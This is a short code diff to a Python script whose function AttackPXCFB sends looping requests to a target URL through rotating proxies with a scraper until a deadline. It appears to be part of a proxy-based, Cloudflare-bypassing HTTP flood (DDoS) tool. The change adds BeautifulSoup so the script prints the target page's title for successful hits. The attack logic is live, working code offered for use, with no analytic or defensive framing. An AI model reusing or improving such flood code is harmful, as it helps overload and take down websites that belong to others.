@@ -16,6 +16,7 @@ from requests.packages.urllib3.util.retry import Retry
 from selenium import webdriver
 from selenium.webdriver.chrome.service import Service
 from selenium.webdriver.chrome.options import Options
+from bs4 import BeautifulSoup
 
 def countdown(t):
     until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
@@ -563,8 +564,12 @@ def AttackPXCFB(url, until_datetime, scraper,proxy,th):
 
                     response = scraper.get(url,headers=headers, proxies=proxies)
                     # response = scraper.get(url,headers=headers)
-                    
-                    print(response.status_code,proxy_url)
+                    if(response.status_code ==200):
+                        soup = BeautifulSoup(response.text, 'html.parser')
+                        # Extract the title
+                        title = soup.title.string
+
+                        print('Page title:', title , proxy_url)
 
                 else:
                     print('proxy rỗng')
